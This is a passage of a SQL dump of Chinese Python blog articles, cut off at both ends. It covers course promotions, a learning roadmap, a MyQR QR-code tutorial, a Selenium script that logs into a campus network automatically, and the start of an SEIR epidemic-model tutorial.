<p>教程结合作者十多年Python开发经验，涉及到的知识点都是在实际工作中遇到的，并且已经解决的各种问题。还有的技术问题是搜集了国内外程序员遇到的各种类型的技术问题，部分和这些程序员直接交流，了解他们的需求以及某些理解上的困难。&nbsp;</p> \n <p></p> \n <p>通过总结这些技术问题，并给出多种可能的解答，将非常有助于Python程序员解决在实际工作中遇到的各种问题。</p> \n <p></p> \n <p><img alt=\"\" height=\"862\" src=\"https://img-blog.csdnimg.cn/20210619234452711.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjM1MDIxMg==,size_16,color_FFFFFF,t_70\" width=\"738\"></p> \n <p></p> \n <p></p> \n <p><strong>教程传送门：【硬核】一线Python程序员实战经验分享</strong></p> \n <p><a href=\"https://marketing.csdn.net/u/weixin_42350212/e/3791\">https://marketing.csdn.net/u/weixin_42350212/e/3791</a></p> \n <h2></h2> \n <h3>【两种方法获取完整源码】</h3> \n <p><strong>1、资源下载：【pygame开发实战开发30例 完整源码】</strong></p> \n <p><a href=\"https://download.csdn.net/download/weixin_42350212/15836285\">https://download.csdn.net/download/weixin_42350212/15836285</a></p> \n <p><strong>2、订阅专栏：【获取完整源码+教程】</strong></p> \n <p id=\"%E4%B8%80%E8%B5%B7%E6%9D%A5%E5%AD%A6pygame%E5%90%A7%20%E6%B8%B8%E6%88%8F%E5%BC%80%E5%8F%9130%E4%BE%8B%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94%E5%A1%94%E9%98%B2%E6%B8%B8%E6%88%8F%20%E4%B8%A8%E8%93%84%E5%8A%9B%E8%AE%A1%E5%88%92\"><strong><a href=\"https://lexsaints.blog.csdn.net/article/details/115672270\">一起来学pygame吧 游戏开发30例（二）——塔防游戏</a></strong></p> \n <p id=\"%E4%B8%80%E8%B5%B7%E6%9D%A5%E5%AD%A6pygame%E5%90%A7%20%E6%B8%B8%E6%88%8F%E5%BC%80%E5%8F%9130%E4%BE%8B%EF%BC%88%E5%9B%9B%EF%BC%89%E2%80%94%E2%80%94%E4%BF%84%E7%BD%97%E6%96%AF%E6%96%B9%E5%9D%97%E5%B0%8F%E6%B8%B8%E6%88%8F%20%E4%B8%A8%E8%93%84%E5%8A%9B%E8%AE%A1%E5%88%92\"><strong><a href=\"https://blog.csdn.net/weixin_42350212/article/details/115699489\">一起来学pygame吧 游戏开发30例（四）——俄罗斯方块小游戏 </a></strong></p> \n <p></p> \n</div>', '2021-07-03', NULL, '默认分类', '', 1, 0, NULL, NULL, 0);
INSERT INTO `t_article` VALUES (93, '学习过程不迷茫，一文教你理清python常用技术的学习路线！《入门到入土伴终生》', '<div id=\"content_views\" class=\"markdown_views prism-atom-one-light\"> \n <svg xmlns=\"http://www.w3.org/2000/svg\" style=\"display: none;\"> \n  <path stroke-linecap=\"round\" d=\"M5,0 0,2.5 5,5z\" id=\"raphael-marker-block\" style=\"-webkit-tap-highlight-color: rgba(0, 0, 0, 0);\"></path> \n </svg> \n <p></p> \n <div class=\"toc\"> \n  <h3>Python学习指南</h3> \n  <ul>\n   <li>\n    <ul>\n     <li><a href=\"#__python_9\">一. 入门到放弃之python学习流程图</a></li>\n     <li><a href=\"#_Python_19\">二. Python入门</a></li>\n     <li><a href=\"#_Python_40\">三. Python数据分析</a></li>\n     <li><a href=\"#_Python_62\">四. Python爬虫</a></li>\n     <li><a href=\"#_Python_73\">五. Python学习技术问题汇总</a></li>\n     <li><a href=\"#__90\">六. 结语</a></li>\n    </ul> </li>\n  </ul> \n </div> \n <p></p> \n <blockquote> \n  <p>本人马上大四，目前正在学习Python，在CSDN上已经发文一段时间了，粉丝也终于突破了2万。近期有粉丝留言交流学习心得，希望我发一些性价比较高的学习教程，和大家分享交流，大家可以有针对性的选择学习。</p> \n </blockquote> \n <p>有问题随时欢迎一起交流呀。</p> \n <hr color=\"#000000\" size=\"1&quot;\"> \n <h2><a id=\"__python_9\"></a>一. 入门到放弃之python学习流程图</h2> \n <blockquote> \n  <p>具体流程图pdf可以加好友我发给你，还有很多收集到的资料</p> \n </blockquote> \n <p><img src=\"https://img-blog.csdnimg.cn/20210615123327831.Png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjY1NDExNA==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p> \n <h2><a id=\"_Python_19\"></a>二. Python入门</h2> \n <ol>\n  <li> <p>这个教程从Python环境搭建讲起，属于最基础的部分，所以即使你没有一点编程经验也可以很快上手！这个教程中用<strong>10个热门案例强化语法</strong>，都是和我们的使用场景非常接近的，比如：<strong>模拟支付宝的能量产生过程、逐行显示蚂蚁庄园动态、模拟“跳一跳”小游戏加分块……</strong></p> </li>\n  <li> <p>除了基础，做开发最重要的就是 <strong>实战项目！</strong> 这份教程里都给你准备好了，游戏开发、淘宝用户数据分析、Django开发商城项目，这几个都是比较大的项目，用在毕设中也是非常不错的。如果你还想研究爬虫或数据分析，也可以继续深入研究。</p> </li>\n </ol> \n <p><img src=\"https://img-blog.csdnimg.cn/20210615112302929.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjY1NDExNA==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p> \n <blockquote> \n  <p>再来说说搭配的实体书，这本书可以说是Python入门必看书籍了，在豆瓣评分9.1分，毫不犹豫入手了！</p> \n </blockquote> \n <p><img src=\"https://img-blog.csdnimg.cn/20210615112332565.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjY1NDExNA==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p> \n <p><font size=\"5\" color=\"red\">💕教程传送门</font> ：<font size=\"5\" color=\"red\"><a href=\"https://marketing.csdn.net/u/weixin_46654114/e/3792\">零基础学python</a></font></p> \n <hr color=\"#000000\" size=\"1&quot;\"> \n <h2><a id=\"_Python_40\"></a>三. Python数据分析</h2> \n <ol>\n  <li> <p>数据分析是Python应用较多的一个领域，这个教程包含了<strong>Python基础、数据采集、数据处理到数据挖掘</strong>，这是我看过比较细致的教程了。</p> </li>\n  <li> <p>主要讲解了<strong>4个领域</strong>的经典项目，每一个项目都是遵从数据分析的<strong>5大步骤</strong>,你可以掌握商业项目的分析方法论。</p> </li>\n </ol> \n <blockquote> \n  <p><strong>商业目标建立→数据获取→数据预处理→建立模型→模型发布</strong></p> \n </blockquote> \n <p><img src=\"https://img-blog.csdnimg.cn/20210615112414146.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjY1NDExNA==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p> \n <p><img src=\"https://img-blog.csdnimg.cn/20210615112422458.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjY1NDExNA==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p> \n <p><font size=\"5\" color=\"red\">💕教程传送门：<a href=\"https://marketing.csdn.net/u/weixin_46654114/e/3781\">Python数据分析与挖掘</a></font></p> \n <hr color=\"#000000\" size=\"1&quot;\"> \n <h2><a id=\"_Python_62\"></a>四. Python爬虫</h2> \n <ol>\n  <li><strong>爬虫</strong>几乎是所有Python工程师都会的，这篇教程详细讲了网络爬虫的<strong>三大基本步骤</strong>（<strong>网络请求、数据解析、数据存储</strong>）。另外还有反爬操作，比如，我们经常容易遇到被反爬虫，比如字体反爬、IP识别、验证码等。</li>\n </ol> \n <p><img src=\"https://img-blog.csdnimg.cn/20210615112437887.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjY1NDExNA==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p> \n <p><font size=\"5\" color=\"red\">💕教程传送门：<a href=\"https://marketing.csdn.net/u/weixin_46654114/e/3782\">150讲轻松搞定Python网络爬虫</a></font></p> \n <hr color=\"#000000\" size=\"1&quot;\"> \n <h2><a id=\"_Python_73\"></a>五. Python学习技术问题汇总</h2> \n <ol>\n  <li> <p>本教程将作者在研发过程中及教学中<strong>收集的学生问题</strong>都汇总了，这些问题都是在实际工作中遇到的。还有的技术问题是搜集了国内外程序员遇到的各种类型的技术问题。</p> </li>\n  <li> <p>通过总结这些技术问题，并给出多种可能的解答，将非常有助于Python程序员解决在<strong>实际工作中遇到的各种问题</strong>。</p> </li>\n </ol> \n <p><img src=\"https://img-blog.csdnimg.cn/20210615112455994.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjY1NDExNA==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p> \n <p><font size=\"5\" color=\"red\">💕教程传送门：<a href=\"https://marketing.csdn.net/u/weixin_46654114/e/3791\">【硬核】一线Python程序员实战经验分享</a></font></p> \n <hr color=\"#000000\" size=\"1&quot;\"> \n <h2><a id=\"__90\"></a>六. 结语</h2> \n <p>写博客多了一年了，感谢csdn和大家的陪伴。</p> \n <p><font size=\"5\" color=\"red\">我写的第一篇程序人生：💕<a href=\"https://blog.csdn.net/weixin_46654114/article/details/116375715?spm=1001.2014.3001.5502\">一年成为博客专家？ 致！奋斗的自己</a></font><br> 编程的路总是那么让人无奈又兴奋，不断的学习新知识，在项目中的到满足感，让我们一起加油吧</p> \n</div>', '2021-07-03', NULL, '默认分类', '', 1, 0, NULL, NULL, 0);
INSERT INTO `t_article` VALUES (94, '隔壁老王都找我要的33款开源爬虫框架，《记得收藏哦！不然看着看着就不见了》', '<div id=\"content_views\" class=\"markdown_views prism-atom-one-light\"> \n <svg xmlns=\"http://www.w3.org/2000/svg\" style=\"display: none;\"> \n  <path stroke-linecap=\"round\" d=\"M5,0 0,2.5 5,5z\" id=\"raphael-marker-block\" style=\"-webkit-tap-highlight-color: rgba(0, 0, 0, 0);\"></path> \n </svg> \n <p></p> \n <div class=\"toc\"> \n  <h3>隔壁老王都找我要的33款开源爬虫框架，《记得收藏哦！不然看着看着就不见了》</h3> \n  <ul> \n   <li><a href=\"#_1\">🏳️‍🌈目录</a></li> \n   <li> \n    <ul> \n     <li></li> \n    </ul></li> \n  </ul> \n </div> \n</div>', '2021-07-03', NULL, '默认分类', '', 1, 0, NULL, NULL, 0);
INSERT INTO `t_article` VALUES (95, '【基础入门详解】程序员的二维码也要玩出不同色彩，用Python生成动态彩色二维码', '<div id=\"content_views\" class=\"markdown_views prism-atom-one-dark\"> \n <svg xmlns=\"http://www.w3.org/2000/svg\" style=\"display: none;\"> \n  <path stroke-linecap=\"round\" d=\"M5,0 0,2.5 5,5z\" id=\"raphael-marker-block\" style=\"-webkit-tap-highlight-color: rgba(0, 0, 0, 0);\"></path> \n </svg> \n <h2><a id=\"_0\"></a>一、前言</h2> \n <p>常见的二维码为QR CodeCode，QR全称是Quick Response，是一个近几年来移动设备上超流行的一种编码方式。它的结构如下：</p> \n <p><img src=\"https://img-blog.csdnimg.cn/20210615162534679.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bnl1bjg4OTkwMQ==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"><br> <strong>主要有以下特点：</strong></p> \n <ol>\n  <li>符号规格从版本1(21×21)到版本40(177×177)，每提高一个版本，每边增加 4 个码元（即指构成 QR 码的方形黑白点）</li>\n  <li>信息容量大：能存储 7089 个数字字符或 4296 个字母字符或 2953 个 8 位字节字符或 1817 汉字字符</li>\n  <li>纠错能力强：即使部分编码变脏或破损，也可以恢复数据。L级约可纠错 7% 的数据码字，M级约可纠错 15% 的数据码字，Q级约可纠错25%的数据码字，H级约可纠错 30% 的数据码字</li>\n  <li>可以从任意方向读取：QR码可以从 360° 任一方向均可快速读取。通过 QR 码中的三处定位图案，可以帮助 QR 码不受背景样式的影响，实现快速稳定的读取</li>\n </ol> \n <h2><a id=\"MyQR_12\"></a>二、MyQR</h2> \n <p>Python中有一个非常有趣好玩的库MyQR，不仅可以制作各种漂亮的二维码，还可以生成动态彩色二维码。</p> \n <p>MyQR可以生成常见的二维码、艺术二维码（黑白或彩色），动态二维码（黑白或彩色）</p> \n <h3><a id=\"1_17\"></a>1.效果如图：</h3> \n <p><img src=\"https://img-blog.csdnimg.cn/2021061515520267.jpg#pic_center\" alt=\"在这里插入图片描述\"></p> \n <p><img src=\"https://img-blog.csdnimg.cn/20210615155152344.gif#pic_center\" alt=\"在这里插入图片描述\"></p> \n <h3><a id=\"2_24\"></a>2.实现步骤</h3> \n <p><strong>第一步要安装MyQR库</strong></p> \n <p>安装MyQR库，直接用pip3 install myqr(or MyQR)。需要注意的是MyQR依赖于Python3，在Python2的环境下可能无法正常运行。</p> \n <blockquote> \n  <p>pip install MyQR -i http://pypi.douban.com/simple --trusted-hostpypi.douban.com</p> \n </blockquote> \n <p><img src=\"https://img-blog.csdnimg.cn/20210615160050216.png#pic_center\" alt=\"在这里插入图片描述\"><br> 这个库提供了两种使用方法，一种是直接使用命令行的方式，另外一种使用import引入，可以设置更多个性化设置。</p> \n <p><strong>第二步参考代码</strong></p> \n <pre><code class=\"prism language-python\"><span class=\"token keyword\">from</span> MyQR <span class=\"token keyword\">import</span> myqr\n<span class=\"token keyword\">import</span> os\n  \nversion<span class=\"token punctuation\">,</span> level<span class=\"token punctuation\">,</span> qr_name <span class=\"token operator\">=</span> myqr<span class=\"token punctuation\">.</span>run<span class=\"token punctuation\">(</span>\n  words<span class=\"token operator\">=</span><span class=\"token string\">\"https://www.baidu.com\"</span><span class=\"token punctuation\">,</span>     <span class=\"token comment\"># 可以是字符串，也可以是网址(前面要加http(s)://)</span>\n  version<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>               <span class=\"token comment\"># 设置容错率为最高</span>\n  level<span class=\"token operator\">=</span><span class=\"token string\">\'H\'</span><span class=\"token punctuation\">,</span>               <span class=\"token comment\"># 控制纠错水平，范围是L、M、Q、H，从左到右依次升高</span>\n  picture<span class=\"token operator\">=</span><span class=\"token string\">\"123.gif\"</span><span class=\"token punctuation\">,</span>              <span class=\"token comment\"># 将二维码和图片合成</span>\n  colorized<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">,</span>             <span class=\"token comment\"># 彩色二维码</span>\n  contrast<span class=\"token operator\">=</span><span class=\"token number\">1.0</span><span class=\"token punctuation\">,</span>              <span class=\"token comment\">#用以调节图片的对比度，1.0 表示原始图片，更小的值表示更低对比度，更大反之。默认为1.0</span>\n  brightness<span class=\"token operator\">=</span><span class=\"token number\">1.0</span><span class=\"token punctuation\">,</span>             <span class=\"token comment\">#用来调节图片的亮度，其余用法和取值同上</span>\n  save_name<span class=\"token operator\">=</span><span class=\"token string\">\"3.gif\"</span><span class=\"token punctuation\">,</span>           <span class=\"token comment\"># 保存文件的名字，格式可以是jpg,png,bmp,gif</span>\n  save_dir<span class=\"token operator\">=</span>os<span class=\"token punctuation\">.</span>getcwd<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>          <span class=\"token comment\">#控制位置</span>\n<span class=\"token punctuation\">)</span>\n \n</code></pre> \n <p>大家直接copy代码更改参数即可使用，注意图片的路径最好和Pytho文件放一起，防止路径不对，如图：</p> \n <p><img src=\"https://img-blog.csdnimg.cn/20210615155606928.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bnl1bjg4OTkwMQ==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"></p> \n <p>在Pycharm中看gif图不会动，可以到文件夹里面看</p> \n <p>给大家一个动图试试手</p> \n <p><img src=\"https://img-blog.csdnimg.cn/20210615155614517.gif#pic_center\" alt=\"在这里插入图片描述\"></p> \n <p>MyQR确实是挺好用的，唯一的缺点就是，不支持中文！！！它只支持以下字符：</p> \n <ol>\n  <li>数字 0 到 9</li>\n  <li>大小写的英文字母</li>\n  <li>常用英文标点符号和空格</li>\n </ol> \n <p>到这里结束了，更多有关Python精彩内容可以关注小编看小编主页或点击下发领取福利。<br> <img src=\"https://img-blog.csdnimg.cn/20210615172911193.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1bnl1bjg4OTkwMQ==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"></p> \n <p><a href=\"https://jq.qq.com/?_wv=1027&amp;k=WkdrMFnf\"><strong>点击领取.福利多多</strong></a></p> \n <blockquote> \n  <p>①兼职交流，行业咨询、大佬在线专业解答有<br> ②Python开发环境安装教程有<br> ③Python400集自学视频有<br> ④软件开发常用词汇有<br> ⑤Python学习路线图有<br> ⑥3000多本Python电子书有 如果你用得到的话可以直接拿走，在我的QQ技术交流群里群号：<mark><strong>675240729</strong></mark>（纯技术交流和资源共享，广告勿入）以自助拿走</p> \n </blockquote> \n</div>', '2021-07-03', NULL, '默认分类', '', 1, 0, NULL, NULL, 0);
INSERT INTO `t_article` VALUES (96, 'Python自动化脚本登录校园网', '<div id=\"content_views\" class=\"markdown_views prism-atom-one-dark\"> \n <svg xmlns=\"http://www.w3.org/2000/svg\" style=\"display: none;\"> \n  <path stroke-linecap=\"round\" d=\"M5,0 0,2.5 5,5z\" id=\"raphael-marker-block\" style=\"-webkit-tap-highlight-color: rgba(0, 0, 0, 0);\"></path> \n </svg> \n <p><strong>Python自动化脚本登录校园网</strong></p> \n <blockquote> \n  <p>所需工具：python编译环境(博主使用的pycharm作演示，其实在cmd也可以操作！)<br> selenium自动化脚本<br> .bat批处理文件<br> 第一步，通过pycharm创建一个项目<br> 点击左上角file,然后new project<br> <img src=\"https://img-blog.csdnimg.cn/20210614233647467.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Rhbmdib2xpYmFv,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> 2.创建项目<br> <img src=\"https://img-blog.csdnimg.cn/20210614233858353.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Rhbmdib2xpYmFv,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> 3.然后右键项目名创建py文件<br> <img src=\"https://img-blog.csdnimg.cn/20210614233956245.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Rhbmdib2xpYmFv,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> 4.在pycharm中调用cmd，（在左下角的terminal就是了），再通过cd命令进入到Scripts文件下，Scripts是自己的python编译器文件夹下的目录<br> <img src=\"https://img-blog.csdnimg.cn/20210614234240832.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3Rhbmdib2xpYmFv,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> <img src=\"https://img-blog.csdnimg.cn/2021061423425686.png\" alt=\"在这里插入图片描述\"></p> \n </blockquote> \n <p>5.下载selenium，指令为： pip install selenium<br> <img src=\"https://img-blog.csdnimg.cn/20210614234428387.png\" alt=\"在这里插入图片描述\"><br> 这里博主下过了，就不再演示了。<br> 6.我们输入校园网网址，打开元素定位界面，进入pycharm编写代码</p> \n <pre><code class=\"prism language-python\"><span class=\"token keyword\">from</span> selenium <span class=\"token keyword\">import</span> webdriver\n<span class=\"token keyword\">import</span> time\n<span class=\"token keyword\">from</span> selenium<span class=\"token punctuation\">.</span>webdriver<span class=\"token punctuation\">.</span>support<span class=\"token punctuation\">.</span>select <span class=\"token keyword\">import</span> Select\ndriver<span class=\"token operator\">=</span>webdriver<span class=\"token punctuation\">.</span>Chrome<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token operator\">//</span>这里参数为你校园网登录地址\ndriver<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">\"http://**********.htm?isReback=1\"</span><span class=\"token punctuation\">)</span>\ntime<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n<span class=\"token operator\">//</span>这个是选择移动联通或者电信的下拉框，如果没有下拉框可以选择无视跳过以下四行代码\nel<span class=\"token operator\">=</span>driver<span class=\"token punctuation\">.</span>find_element_by_xpath<span class=\"token punctuation\">(</span><span class=\"token string\">\"//select[@name=\'ISP_select\']\"</span><span class=\"token punctuation\">)</span>\ntime<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\nSelect<span class=\"token punctuation\">(</span>el<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>select_by_visible_text<span class=\"token punctuation\">(</span><span class=\"token string\">\"中国移动\"</span><span class=\"token punctuation\">)</span>\ntime<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n<span class=\"token operator\">//</span>这里我们通过元素定位找到输入账号的标签根据你学校的来修改<span class=\"token punctuation\">[</span>@<span class=\"token punctuation\">]</span>里的内容\ndriver<span class=\"token punctuation\">.</span>find_element_by_xpath<span class=\"token punctuation\">(</span><span class=\"token string\">\"//input[@type=\'text\']\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>send_keys<span class=\"token punctuation\">(</span><span class=\"token string\">\"此处为你的学号\"</span><span class=\"token punctuation\">)</span>\ntime<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n<span class=\"token operator\">//</span>同理上面，定位到密码标签修改<span class=\"token punctuation\">[</span>@<span class=\"token punctuation\">]</span>里的内容\ndriver<span class=\"token punctuation\">.</span>find_element_by_xpath<span class=\"token punctuation\">(</span><span class=\"token string\">\"//input[@type=\'password\']\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>send_keys<span class=\"token punctuation\">(</span><span class=\"token string\">\"你的密码\"</span><span class=\"token punctuation\">)</span>\ntime<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n<span class=\"token operator\">//</span>这里需要定位你们的登录按钮，找到元素同理修改<span class=\"token punctuation\">[</span>@<span class=\"token punctuation\">]</span>里的内容\ndriver<span class=\"token punctuation\">.</span>find_element_by_xpath<span class=\"token punctuation\">(</span><span class=\"token string\">\"//input[@type=\'submit\']\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>click<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\ntime<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span>\ndriver<span class=\"token punctuation\">.</span>quit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n</code></pre> \n <ol start=\"7\">\n  <li></li>\n </ol> \n <blockquote> \n  <p>创建.bat文件，通过记事本打开 写入 python D:???\\自动登录校园网.py，此处为你这个py所在的绝对路径。</p> \n </blockquote> \n <ol start=\"8\">\n  <li></li>\n </ol> \n <blockquote> \n  <p>把这个.bat文件放进C:\\Users\\玛卡巴卡\\AppData\\Roaming\\Microsoft\\Windows\\Start<br> Menu\\Programs\\Startup文件夹下 那个玛卡巴卡根据自己的电脑用户名写！！ 完成后就可以开机自启！！</p> \n </blockquote> \n</div>', '2021-07-03', NULL, '默认分类', '', 1, 0, NULL, NULL, 0);
INSERT INTO `t_article` VALUES (97, 'Python小白的数学建模课-B5. 新冠疫情 SEIR模型', '<div id=\"content_views\" class=\"markdown_views prism-atom-one-light\"> \n <svg xmlns=\"http://www.w3.org/2000/svg\" style=\"display: none;\"> \n  <path stroke-linecap=\"round\" d=\"M5,0 0,2.5 5,5z\" id=\"raphael-marker-block\" style=\"-webkit-tap-highlight-color: rgba(0, 0, 0, 0);\"></path> \n </svg> \n <br> \n <p><strong>传染病的数学模型是数学建模中的典型问题，常见的传染病模型有 SI、SIR、SIRS、SEIR 模型。</strong></p> \n <p><strong>考虑存在易感者、暴露者、患病者和康复者四类人群，适用于具有潜伏期、治愈后获得终身免疫的传染病。</strong></p> \n <p><strong>本文详细给出了 SEIR 模型微分方程的建模、例程、结果和分析，让小白都能懂。</strong></p> \n <p><strong><a href=\"https://blog.csdn.net/youcans/category_11031563.html\">『Python小白的数学建模课 @ Youcans』</a>带你从数模小白成为国赛达人。</strong></p> \n <hr> \n <br> \n <h2><a id=\"1_SEIR__15\"></a>1. SEIR 模型</h2> \n <h3><a id=\"11_SEIR__17\"></a>1.1 SEIR 模型的提出</h3> \n <p>建立传染病的数学模型来描述传染病的传播过程，要根据传染病的发病机理和传播规律， 结合疫情数据进行拟合分析，可以认识传染病的发展趋势，预测疫情持续时间和规模，分析和模拟各种防控措施对疫情发展的影响程度， 为传染病防控工作提供决策指导，具有重要的理论意义和现实意义。</p> \n <p>SI 模型是最简单的传染病传播模型，把人群分为易感者（S 类）和患病者（I 类）两类，通过 SI 模型可以预测传染病高潮的到来；提高卫生水平、强化防控手段，降低病人的日接触率，可以推迟传染病高潮的到来。在 SI 模型基础上发展的 SIS 模型考虑患病者可以治愈而变成易感者，SIS 模型表面传染期接触数 <span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\"> σ \\sigma </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 0.43056em; vertical-align: 0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right: 0.03588em;\">σ</span></span></span></span></span> 是传染病传播和防控的关键指标，决定了疫情终将清零或演变为地方病长期存在。在 SI 模型基础上考虑病愈免疫的康复者（R 类）就得到 SIR 模型，通过 SIR 模型也揭示传染期接触数 <span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\"> σ \\sigma </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 0.43056em; vertical-align: 0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right: 0.03588em;\">σ</span></span></span></span></span> 是传染病传播的阈值，满足 <span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\"> s 0 &gt; 1 / σ s_0&gt;1/\\sigma </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 0.6891em; vertical-align: -0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\">s</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.301108em;\"><span class=\"\" style=\"top: -2.55em; margin-left: 0em; margin-right: 0.05em;\"><span class=\"pstrut\" style=\"height: 2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.15em;\"><span class=\"\"></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span><span class=\"mrel\">&gt;</span><span class=\"mspace\" style=\"margin-right: 0.277778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height: 1em; vertical-align: -0.25em;\"></span><span class=\"mord\">1</span><span class=\"mord\">/</span><span class=\"mord mathdefault\" style=\"margin-right: 0.03588em;\">σ</span></span></span></span></span> 才会发生传染病蔓延，由此可以分析各种防控措施，如：提高卫生水平来降低日接触率<span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\"> λ \\lambda </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 0.69444em; vertical-align: 0em;\"></span><span class=\"mord mathdefault\">λ</span></span></span></span></span>、提高医疗水平来提高日治愈率 <span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\"> μ \\mu </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 0.625em; vertical-align: -0.19444em;\"></span><span class=\"mord mathdefault\">μ</span></span></span></span></span>，通过预防接种达到群体免疫来降低 <span class=\"katex--inline\"><span class=\"katex\"><span class=\"katex-mathml\"> s 0 s_0 </span><span class=\"katex-html\"><span class=\"base\"><span class=\"strut\" style=\"height: 0.58056em; vertical-align: -0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\">s</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height: 0.301108em;\"><span class=\"\" style=\"top: -2.55em; margin-left: 0em; margin-right: 0.05em;\"><span class=\"pstrut\" style=\"height: 2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span 